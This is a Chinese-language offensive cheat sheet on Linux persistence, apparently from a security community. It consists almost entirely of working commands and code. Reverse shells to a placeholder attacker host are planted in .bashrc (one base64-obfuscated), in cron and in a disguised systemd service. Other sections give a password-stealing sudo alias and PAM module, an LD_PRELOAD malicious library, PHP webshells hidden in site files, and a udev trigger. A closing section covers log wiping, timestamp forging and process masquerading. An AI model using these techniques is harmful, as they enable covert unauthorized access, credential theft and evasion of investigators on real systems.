# Linux持久化技术

> @TGSEC社区 · @TGSEC-Qtzuu 整理

## 一、SSH密钥后门

```bash
# 生成密钥对(攻击机)
ssh-keygen -t ed25519 -f /tmp/backdoor_key -N ""

# 植入公钥(目标机)
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA...公钥内容..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 连接
ssh -i /tmp/backdoor_key root@TARGET

# 隐蔽:修改时间戳
touch -r /etc/passwd /root/.ssh/authorized_keys
```

## 二、.bashrc/.profile后门

```bash
# 用户登录时执行反弹shell
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &' >> /root/.bashrc

# 更隐蔽:base64编码
echo 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE= | base64 -d | bash &' >> ~/.bashrc

# 或通过alias劫持
echo "alias sudo='echo -n \"[sudo] password: \"; read -s pwd; echo; echo \$pwd >> /tmp/.pw; sudo'" >> ~/.bashrc
```

## 三、Crontab后门

```bash
# 每5分钟反弹shell
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'") | crontab -

# 更隐蔽:写入系统级cron
echo "* * * * * root /tmp/.hidden.sh" >> /etc/crontab

# 用at命令(一次性,但可自我重建)
echo "/tmp/.hidden.sh" | at now + 1 minute
```

## 四、systemd service后门

```bash
cat > /etc/systemd/system/update-notifier.service << 'EOF'
[Unit]
Description=System Update Notifier
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/ATTACKER/4444 0>&1; sleep 60; done'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable update-notifier.service
systemctl start update-notifier.service
```

## 五、LD_PRELOAD劫持

```bash
# 编写恶意共享库
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    if (getuid() == 0 && access("/tmp/.triggered", F_OK) != 0) {
        system("touch /tmp/.triggered && bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' &");
    }
}
EOF
gcc -shared -fPIC -o /usr/lib/libupdate.so /tmp/evil.c
echo "/usr/lib/libupdate.so" >> /etc/ld.so.preload
# 任何程序运行时都会加载
```

## 六、PAM后门

```bash
# 修改PAM认证模块,允许万能密码登录
# 下载pam源码,修改pam_unix_auth.c添加万能密码
# 编译后替换 /lib/x86_64-linux-gnu/security/pam_unix.so

# 简化版:记录所有密码
cat > /tmp/pam_log.c << 'EOF'
#include <stdio.h>
#include <security/pam_modules.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user, *pass;
    pam_get_item(pamh, PAM_USER, (const void**)&user);
    pam_get_item(pamh, PAM_AUTHTOK, (const void**)&pass);
    FILE *f = fopen("/tmp/.passwords", "a");
    if (f) { fprintf(f, "%s:%s\n", user, pass); fclose(f); }
    return PAM_SUCCESS;  // 总是认证成功
}
EOF
```

## 七、SSHD配置后门

```bash
# 添加后门端口
echo "Port 22" >> /etc/ssh/sshd_config
echo "Port 31337" >> /etc/ssh/sshd_config
systemctl restart sshd

# 允许root登录
sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
```

## 八、Webshell持久化

```bash
# PHP一句话
echo '<?php @eval($_POST["cmd"]);?>' > /var/www/html/.config.php

# 隐蔽:混入正常文件
sed -i '1i <?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' /var/www/html/index.php

# 内存马(PHP)
# 通过.user.ini预加载
echo "auto_prepend_file=/tmp/.cache.php" > /var/www/html/.user.ini
echo '<?php @eval($_POST["x"]);?>' > /tmp/.cache.php
```

## 九、udev rules后门

```bash
# 插入USB时触发
echo 'ACTION=="add", SUBSYSTEM=="usb", RUN+="/tmp/.hidden.sh"' > /etc/udev/rules.d/99-backdoor.rules
udevadm control --reload-rules
```

## 十、隐蔽技巧

```bash
# 修改文件时间戳
touch -r /etc/passwd /path/to/backdoor

# 隐藏文件(点开头)
mv backdoor.sh .backdoor.sh

# 隐藏进程名
exec -a "[kworker/0:0]" /tmp/backdoor &
cp /tmp/backdoor /usr/lib/systemd/systemd-logind-helper

# 清除日志
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c && echo "" > ~/.bash_history

# 隐藏网络连接(LD_PRELOAD)
# 通过劫持libc的connect函数隐藏特定IP的连接

# immutable属性防删
chattr +i /path/to/backdoor
# 删除时需要: chattr -i
```
